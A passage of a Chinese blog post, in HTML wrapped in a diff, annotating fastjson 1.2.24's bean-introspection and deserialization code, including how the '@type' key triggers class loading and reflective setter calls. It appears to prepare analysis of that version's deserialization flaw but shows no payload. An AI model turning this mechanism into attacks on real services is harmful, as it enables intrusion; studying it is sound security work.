class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Method method : methods) &#123; <span class="hljs-comment">//开始遍历所有public方法</span><br>    <span class="hljs-keyword">int</span> ordinal = <span class="hljs-number">0</span>, serialzeFeatures = <span class="hljs-number">0</span>, parserFeatures = <span class="hljs-number">0</span>;<br>    String methodName = method.getName();<br>    <span class="hljs-keyword">if</span> (methodName.length() &lt; <span class="hljs-number">4</span>) &#123;<span class="hljs-keyword">continue</span>;&#125;	<span class="hljs-comment">// 方法名小于4直接跳过</span><br><br>    <span class="hljs-keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;<span class="hljs-keyword">continue</span>;&#125;	<span class="hljs-comment">// 静态方法直接跳过</span><br><br>    <span class="hljs-comment">// support builder set	返回类型是否是空，或返回类型和底层成员类型相同(后半部分我不理解)</span><br>    <span class="hljs-keyword">if</span> (!(method.getReturnType().equals(Void.TYPE) || 	method.getReturnType().equals(method.getDeclaringClass()))) &#123;<span class="hljs-keyword">continue</span>;&#125;<br>    <br>    Class&lt;?&gt;[] types = method.getParameterTypes();<br>    <span class="hljs-keyword">if</span> (types.length != <span class="hljs-number">1</span>) &#123;<span class="hljs-keyword">continue</span>;&#125;	<span class="hljs-comment">// 看有几个参数</span><br><br>    JSONField annotation = method.getAnnotation(JSONField.class);	<span class="hljs-comment">// 又是那个注解，跳过</span><br><br>    <span class="hljs-keyword">if</span> (annotation == <span class="hljs-keyword">null</span>) &#123;annotation = TypeUtils.getSuperMethodAnnotation(clazz, method);&#125;<br><br>    <span class="hljs-keyword">if</span> (annotation != <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!annotation.deserialize()) &#123;<span class="hljs-keyword">continue</span>;&#125;	<span class="hljs-comment">// 忽略</span><br>			...<br>        &#125;<br>    &#125;<br>	<span class="hljs-comment">// TODO &quot;set&quot;的判断放在 JSONField 注解后面，意思是允许非 setter 方法标记 JSONField 注解</span><br>	<span class="hljs-comment">// 判断该方法是否是以set开头，从这里能够看出来差不多就是在找setter方法</span><br>    <span class="hljs-keyword">if</span> (!methodName.startsWith(<span class="hljs-string">&quot;set&quot;</span>)) &#123; <br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">char</span> c3 = methodName.charAt(<span class="hljs-number">3</span>);<br><br>    String propertyName;<br>    <span class="hljs-keyword">if</span> (Character.isUpperCase(c3) <span class="hljs-comment">//	方法名的第4位是否是大写，或者是Unicode编码</span><br>        || c3 &gt; <span class="hljs-number">512</span> <span class="hljs-comment">// for unicode method name</span><br>       ) &#123;<br>        <span class="hljs-keyword">if</span> (TypeUtils.compatibleWithJavaBean) &#123;	<span class="hljs-comment">// 默认false</span><br>            propertyName = TypeUtils.decapitalize(methodName.substring(<span class="hljs-number">3</span>));<br>        &#125; <span class="hljs-keyword">else</span> &#123;	<span class="hljs-comment">// 获取小写的方法名，删除set部分，取后面的部分</span><br>            propertyName = Character.toLowerCase(methodName.charAt(<span class="hljs-number">3</span>)) + methodName.substring(<span class="hljs-number">4</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c3 == <span class="hljs-string">&#x27;_&#x27;</span>) &#123;	<span class="hljs-comment">// 不一样的写法</span><br>        propertyName = methodName.substring(<span class="hljs-number">4</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c3 == <span class="hljs-string">&#x27;f&#x27;</span>) &#123;	<span class="hljs-comment">// 不一样的写法</span><br>        propertyName = methodName.substring(<span class="hljs-number">3</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (methodName.length() &gt;= <span class="hljs-number">5</span> &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="hljs-number">4</span>))) &#123;	<span class="hljs-comment">// 不一样的写法</span><br>        propertyName = TypeUtils.decapitalize(methodName.substring(<span class="hljs-number">3</span>));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>	<span class="hljs-comment">// 这部分其实也引入了另一个点：就是无需存在对应的字段，只需要存在符合条件的setter方法</span><br>    Field field = TypeUtils.getField(clazz, propertyName, declaredFields);	<span class="hljs-comment">// 从field中查一下是否存在对应的字段</span><br>    <span class="hljs-keyword">if</span> (field == <span class="hljs-keyword">null</span> &amp;&amp; types[<span class="hljs-number">0</span>] == <span class="hljs-keyword">boolean</span>.class) &#123;	<span class="hljs-comment">// 没有找到同名的,并且参数类型时boolean则进入</span><br>        String isFieldName = <span class="hljs-string">&quot;is&quot;</span> + Character.toUpperCase(propertyName.charAt(<span class="hljs-number">0</span>)) + propertyName.substring(<span class="hljs-number">1</span>);<br>        field = TypeUtils.getField(clazz, isFieldName, declaredFields);<br>    &#125;<br><br>    JSONField fieldAnnotation = <span class="hljs-keyword">null</span>;	<span class="hljs-comment">// 又是那个注解</span><br>    <span class="hljs-keyword">if</span> (field != <span class="hljs-keyword">null</span>) &#123;<br>        fieldAnnotation = field.getAnnotation(JSONField.class);	<span class="hljs-comment">// 看一下该字段上面有没有JSONType注解</span><br><br>        <span class="hljs-keyword">if</span> (fieldAnnotation != <span class="hljs-keyword">null</span>) &#123;<br>            ...	&#125;	<span class="hljs-comment">// 没那个注解，进不去</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (propertyNamingStrategy != <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-comment">// 这个一般也进不去</span><br>    &#125;<br>		<span class="hljs-comment">// 创建FieldInfo，并且添加到fieldList</span><br>    add(fieldList, <span class="hljs-keyword">new</span> FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures,<br>                                 annotation, fieldAnnotation, <span class="hljs-keyword">null</span>));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>总结一下这个循环，遍历所有public方法，找出符合条件的setter方法，主要有以下几点条件：</p>
+<ol>
+<li>public修饰</li>
+<li>不是静态方法</li>
+<li>以set开头，并且方法名大于4</li>
+<li>参数只有1个</li>
+<li>返回值是否为空</li>
+</ol>
+<p>在来看第二个for循环</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Field field : clazz.getFields()) &#123; <span class="hljs-comment">// public static fields</span><br>    <span class="hljs-keyword">int</span> modifiers = field.getModifiers();	<span class="hljs-comment">// 获取field的修饰符</span><br>    <span class="hljs-keyword">if</span> ((modifiers &amp; Modifier.STATIC) != <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">continue</span>;&#125;	<span class="hljs-comment">// 判断是否是静态属性</span><br><br>    <span class="hljs-keyword">if</span>((modifiers &amp; Modifier.FINAL) != <span class="hljs-number">0</span>) &#123;	<span class="hljs-comment">// 是否是final修饰的属性</span><br>        ...&#125;<br><br>    <span class="hljs-keyword">boolean</span> contains = <span class="hljs-keyword">false</span>;	<br>    <span class="hljs-keyword">for</span> (FieldInfo item : fieldList) &#123;<br>        <span class="hljs-keyword">if</span> (item.name.equals(field.getName())) &#123;	<span class="hljs-comment">// 这是猜测就是用于查缺补漏，如果有field，却没有对应的set方法</span><br>            contains = <span class="hljs-keyword">true</span>;<br>            <span class="hljs-keyword">break</span>; <span class="hljs-comment">// 已经是 contains = true，无需继续遍历</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (contains) &#123;<span class="hljs-keyword">continue</span>;&#125;	<span class="hljs-comment">// 跳回，然后遍历下一个field</span><br>	<span class="hljs-comment">// 当有field,却没有对应的set方法时，才会执行下面，其实也可以不看</span><br>    <span class="hljs-keyword">int</span> ordinal = <span class="hljs-number">0</span>, serialzeFeatures = <span class="hljs-number">0</span>, parserFeatures = <span class="hljs-number">0</span>;<br>    String propertyName = field.getName();<br><br>    JSONField fieldAnnotation = field.getAnnotation(JSONField.class);<br><br>    <span class="hljs-keyword">if</span> (fieldAnnotation != <span class="hljs-keyword">null</span>) &#123;...&#125;	<span class="hljs-comment">// 又是那个注解的东西</span><br><br>    <span class="hljs-keyword">if</span> (propertyNamingStrategy != <span class="hljs-keyword">null</span>) &#123;<br>        propertyName = propertyNamingStrategy.translate(propertyName);<br>    &#125;<br>	<span class="hljs-comment">// 把那个没有set方法的 field也添加至fieldList终</span><br>    add(fieldList, <span class="hljs-keyword">new</span> FieldInfo(propertyName, <span class="hljs-keyword">null</span>, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, <span class="hljs-keyword">null</span>,<br>                                 fieldAnnotation, <span class="hljs-keyword">null</span>));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>总结一下：感觉这个循环更像是个差缺补漏，怕遗漏的某个字段</p>
+<p>第三个for循环</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Method method : clazz.getMethods()) &#123; <span class="hljs-comment">// getter methods	获取public修饰的符合条件的get方法</span><br>    String methodName = method.getName();<br>    <span class="hljs-keyword">if</span> (methodName.length() &lt; <span class="hljs-number">4</span>) &#123;<span class="hljs-keyword">continue</span>;&#125;	<span class="hljs-comment">// 名称长度大于4</span><br><br>    <span class="hljs-keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;<span class="hljs-keyword">continue</span>;&#125;	<span class="hljs-comment">// 是否是静态方法</span><br>	<span class="hljs-comment">// 以get开头，并且第四位大写</span><br>    <span class="hljs-keyword">if</span> (methodName.startsWith(<span class="hljs-string">&quot;get&quot;</span>) &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="hljs-number">3</span>))) &#123;<br>        <span class="hljs-keyword">if</span> (method.getParameterTypes().length != <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">continue</span>;&#125;<br>		<span class="hljs-comment">// 当返回值是Collection/Map/AtomicBoolean/AtomicInteger/AtomicLong  进入</span><br>        <span class="hljs-keyword">if</span> (Collection.class.isAssignableFrom(method.getReturnType()) <span class="hljs-comment">//</span><br>            || Map.class.isAssignableFrom(method.getReturnType()) <span class="hljs-comment">//</span><br>            || AtomicBoolean.class == method.getReturnType() <span class="hljs-comment">//</span><br>            || AtomicInteger.class == method.getReturnType() <span class="hljs-comment">//</span><br>            || AtomicLong.class == method.getReturnType() <span class="hljs-comment">//</span><br>           ) &#123;<br>            String propertyName;<br><br>            JSONField annotation = method.getAnnotation(JSONField.class);	<span class="hljs-comment">// 辣个注解</span><br>            <span class="hljs-keyword">if</span> (annotation != <span class="hljs-keyword">null</span> &amp;&amp; annotation.deserialize()) &#123;<span class="hljs-keyword">continue</span>;&#125;<br><br>            <span class="hljs-keyword">if</span> (annotation != <span class="hljs-keyword">null</span> &amp;&amp; annotation.name().length() &gt; <span class="hljs-number">0</span>) &#123;propertyName = annotation.name();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                propertyName = Character.toLowerCase(methodName.charAt(<span class="hljs-number">3</span>)) + methodName.substring(<span class="hljs-number">4</span>);<br>            &#125;<br><br>            FieldInfo fieldInfo = getField(fieldList, propertyName);<br>            <span class="hljs-keyword">if</span> (fieldInfo != <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (propertyNamingStrategy != <span class="hljs-keyword">null</span>) &#123;<br>                propertyName = propertyNamingStrategy.translate(propertyName);<br>            &#125;<br>			<span class="hljs-comment">// 也就是返回类型必须符合要求才能将某些get方法添加至fieldList</span><br>            add(fieldList, <span class="hljs-keyword">new</span> FieldInfo(propertyName, method, <span class="hljs-keyword">null</span>, clazz, type, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, annotation, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>三个循环结束，然后<code>new JavaBeanInfo()</code>，然后就返回了，来看一下JavaBeanInfo里面有啥</p>
+<p><img src="/2022/11/12/fastjson1.2.24/14.png" srcset="/img/loading.gif" lazyload></p>
+<p>简单总结一下<code>JavaBeanInfo.build()</code>，获取指定类的构造器、字段、以及一些符合条件的getter方法，只不过存储的形式还是相当于是字段，向下走，来到又一个<code>JavaBeanInfo.build()</code></p>
+<p><img src="/2022/11/12/fastjson1.2.24/15.png" srcset="/img/loading.gif" lazyload></p>
+<p>改asmEnable有两种简单的方式，一种是IDEA直接改，另一种是参考大佬的，在JavaBean中添加一个返回类型为<code>Collection/Map/AtomicBoolean/AtomicInteger/AtomicLong</code>这种形式的getter方法，我选择IDEA直接改，然后来到了我想去的地方</p>
+<p><img src="/2022/11/12/fastjson1.2.24/16.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个其实也没啥好看的，就是new了个对象😍，最后就是retrun这个反序列化器了，其实这段也没啥好看的，因为这段啥也没调</p>
+<p><img src="/2022/11/12/fastjson1.2.24/17.png" srcset="/img/loading.gif" lazyload></p>
+<p>一路返回，来到<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code></p>
+<p>反序列化器弄好了，接下来就是反序列化了</p>
+<p><img src="/2022/11/12/fastjson1.2.24/18.png" srcset="/img/loading.gif" lazyload></p>
+<p>一路跟进，经过几个重载，来到<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze(com.alibaba.fastjson.parser.DefaultJSONParser, java.lang.reflect.Type, java.lang.Object, java.lang.Object, int)</code></p>
+<p><img src="/2022/11/12/fastjson1.2.24/19.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来又是一堆判断了，跳过不重要的或者没必要关注的，直接来到一个比较关键的for循环</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 删除了一些值初始化、异常等</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> fieldIndex = <span class="hljs-number">0</span>;; fieldIndex++) &#123;	<span class="hljs-comment">// 循环所有字段</span><br>    ...<br>    <span class="hljs-keyword">if</span> (fieldIndex &lt; sortedFieldDeserializers.length) &#123;	<br>        <span class="hljs-comment">// 经过排序后的字段反序列化器，也就是对应着前面分析时添加至fieldList中的</span><br>        fieldDeser = sortedFieldDeserializers[fieldIndex];<br>        fieldInfo = fieldDeser.fieldInfo;<br>        fieldClass = fieldInfo.fieldClass;<br>        feildAnnotation = fieldInfo.getAnnotation();<br>    &#125;<br><br>    <span class="hljs-keyword">boolean</span> matchField = <span class="hljs-keyword">false</span>;	<span class="hljs-comment">// 匹配状态</span><br>    <span class="hljs-keyword">boolean</span> valueParsed = <span class="hljs-keyword">false</span>;<br><br>    Object fieldValue = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">if</span> (fieldDeser != <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">char</span>[] name_chars = fieldInfo.name_chars;	<span class="hljs-comment">// 获取字段名称，例如&quot;name&quot;:  JSON字符串中获取</span><br>        <span class="hljs-comment">// 总结一下，下面的这些if / else if / else都是根据不同的情况从JSON字符串中拿值，所以留个例子看一下就好了</span><br>        <span class="hljs-keyword">if</span> (fieldClass == <span class="hljs-keyword">int</span>.class || fieldClass == Integer.class) &#123;	<span class="hljs-comment">// 字段类型是int或Inter时进入</span><br>            fieldValue = lexer.scanFieldInt(name_chars);	<span class="hljs-comment">// 从JSON字符串中获取值</span><br><br>            <span class="hljs-keyword">if</span> (lexer.matchStat &gt; <span class="hljs-number">0</span>) &#123;	<span class="hljs-comment">// 猜测这里是对某这值key value值匹配成功时，将匹配状态设置为true</span><br>                matchField = <span class="hljs-keyword">true</span>;	<br>                valueParsed = <span class="hljs-keyword">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (lexer.matchStat == JSONLexer.NOT_MATCH_NAME) &#123;<br>                <span class="hljs-keyword">continue</span>;  <br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!matchField) &#123;	<span class="hljs-comment">// 值未匹配成功时进入，可以理解为不是上面他自己定义的哪些常见的值时</span><br>        key = lexer.scanSymbol(parser.symbolTable);<br><br>        <span class="hljs-keyword">if</span> (key == <span class="hljs-keyword">null</span>) &#123;	<span class="hljs-comment">// 一些获取值</span><br>            token = lexer.token();<br>            <span class="hljs-keyword">if</span> (token == JSONToken.RBRACE) &#123;<br>                lexer.nextToken(JSONToken.COMMA);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (token == JSONToken.COMMA) &#123;<br>                <span class="hljs-keyword">if</span> (lexer.isEnabled(Feature.AllowArbitraryCommas)) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;$ref&quot;</span> == key) &#123;	<span class="hljs-comment">// 判断key是否是$ref</span><br>            lexer.nextTokenWithColon(JSONToken.LITERAL_STRING);<br>            token = lexer.token();<br>            <span class="hljs-keyword">if</span> (token == JSONToken.LITERAL_STRING) &#123;<br>                String ref = lexer.stringVal();<br>                <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;@&quot;</span>.equals(ref)) &#123;	<span class="hljs-comment">// 一些不一样的写法举个例子就好，下面的就都删了</span><br>                    object = context.object;<br>                &#125;  <span class="hljs-keyword">else</span> &#123;<br>                    parser.addResolveTask(<span class="hljs-keyword">new</span> ResolveTask(context, ref));<br>                    parser.resolveStatus = DefaultJSONParser.NeedToResolve;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                ...	<span class="hljs-comment">// 异常</span><br>            &#125;<br><br>            lexer.nextToken(JSONToken.RBRACE);<br>            <span class="hljs-keyword">if</span> (lexer.token() != JSONToken.RBRACE) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;illegal ref&quot;</span>);<br>            &#125;<br>            lexer.nextToken(JSONToken.COMMA);<br><br>            parser.setContext(context, object, fieldName);<br><br>            <span class="hljs-keyword">return</span> (T) object;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (JSON.DEFAULT_TYPE_KEY == key) &#123;	<span class="hljs-comment">// key是否是@type,也就是判断下这个字段的类型是不是还是个JavaBean</span><br>            lexer.nextTokenWithColon(JSONToken.LITERAL_STRING);<br>            <span class="hljs-keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;<br>                String typeName = lexer.stringVal();<br>                lexer.nextToken(JSONToken.COMMA);<br><br>                <span class="hljs-keyword">if</span> (typeName.equals(beanInfo.typeName)) &#123;<br>                    <span class="hljs-keyword">if</span> (lexer.token() == JSONToken.RBRACE) &#123;<br>                        lexer.nextToken();<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>	<br>                ParserConfig config = parser.getConfig();		<span class="hljs-comment">// 这些都跟以前的判断基本相同</span><br>                ObjectDeserializer deserizer = getSeeAlso(config, <span class="hljs-keyword">this</span>.beanInfo, typeName);<br>                Class&lt;?&gt; userType = <span class="hljs-keyword">null</span>;<br>                <span class="hljs-keyword">if</span> (deserizer == <span class="hljs-keyword">null</span>) &#123;<br>                    userType = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());<br><br>                    Class&lt;?&gt; expectClass = TypeUtils.getClass(type);<br>                    <span class="hljs-keyword">if</span> (expectClass == <span class="hljs-keyword">null</span> || <br>                        (userType != <span class="hljs-keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(userType))) &#123;<br>                        deserizer = parser.getConfig().getDeserializer(userType);                                        <br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;type not match&quot;</span>);<br>                    &#125;<br>                &#125;<br>			<br>                <span class="hljs-keyword">return</span> (T) deserizer.deserialze(parser, userType, fieldName);	<span class="hljs-comment">// 在进行一次反序列化喽</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;syntax error&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (object == <span class="hljs-keyword">null</span> &amp;&amp; fieldValues == <span class="hljs-keyword">null</span>) &#123;	<span class="hljs-comment">// Object相当于返回值</span><br>        object = createInstance(parser, type);	<span class="hljs-comment">// 初始化JavaBean使用默认构造器</span><br>        <span class="hljs-keyword">if</span> (object == <span class="hljs-keyword">null</span>) &#123;	<span class="hljs-comment">// 如果无法实例化这个JavaBean,那么就先创建一个hashMap,后面可能会做成一个JSONObject</span><br>            fieldValues = <span class="hljs-keyword">new</span> HashMap&lt;String, Object&gt;(<span class="hljs-keyword">this</span>.fieldDeserializers.length);<br>        &#125;<br>        childContext = parser.setContext(context, object, fieldName);	<span class="hljs-comment">// 不清楚</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (matchField) &#123;<br>        <span class="hljs-keyword">if</span> (!valueParsed) &#123;<br>            fieldDeser.parseField(parser, object, type, fieldValues);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (object == <span class="hljs-keyword">null</span>) &#123;<br>                fieldValues.put(fieldInfo.name, fieldValue);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fieldValue == <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-keyword">if</span> (fieldClass != <span class="hljs-keyword">int</span>.class &amp;&amp; fieldClass != <span class="hljs-keyword">long</span>.class &amp;&amp; fieldClass != <span class="hljs-keyword">float</span>.class <br>                    &amp;&amp; fieldClass != <span class="hljs-keyword">double</span>.class <span class="hljs-comment">//</span><br>                    &amp;&amp; fieldClass != <span class="hljs-keyword">boolean</span>.class <span class="hljs-comment">//	当值为这几种类型时，进入这个setValue</span><br>                   ) &#123;<br>                    fieldDeser.setValue(object, fieldValue);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                fieldDeser.setValue(object, fieldValue);	<span class="hljs-comment">// 否则进入该setValue,使用反射去调用对应的set方法</span><br>            &#125;<br>            <span class="hljs-keyword">if</span> (lexer.matchStat == JSONLexer.END) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;	<span class="hljs-comment">// 当FieldValue在上面无法获取值时，使用如下方法设置field的值，也是通过调用对应的set方法</span><br>        <span class="hljs-keyword">boolean</span> match = parseField(parser, key, object, type, fieldValues);	<br>        <span class="hljs-keyword">if</span> (!match) &#123;<br>            <span class="hljs-keyword">if</span> (lexer.token() == JSONToken.RBRACE) &#123;<br>                lexer.nextToken();<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">continue</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (lexer.token() == JSONToken.COLON) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;syntax error, unexpect token &#x27;:&#x27;&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (lexer.token() == JSONToken.COMMA) &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (lexer.token() == JSONToken.RBRACE) &#123;<br>        lexer.nextToken(JSONToken.COMMA);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (lexer.token() == JSONToken.IDENTIFIER || lexer.token() == JSONToken.ERROR) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;syntax error, unexpect token &quot;</span> + JSONToken.name(lexer.token()));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>总结一下这个循环，从JSON字符串中获取对应字段，获取字段的值，然后使用默认构造器创建该JavaBean的对象实例，再通过反射调用对应的setter方法设置其值，最终返回该对象实例</p>
+<p>然后一步步返回至<code>com.alibaba.fastjson.JSON#parseObject(java.lang.String)</code></p>
+<p><img src="/2022/11/12/fastjson1.2.24/20.png" srcset="/img/loading.gif" lazyload></p>
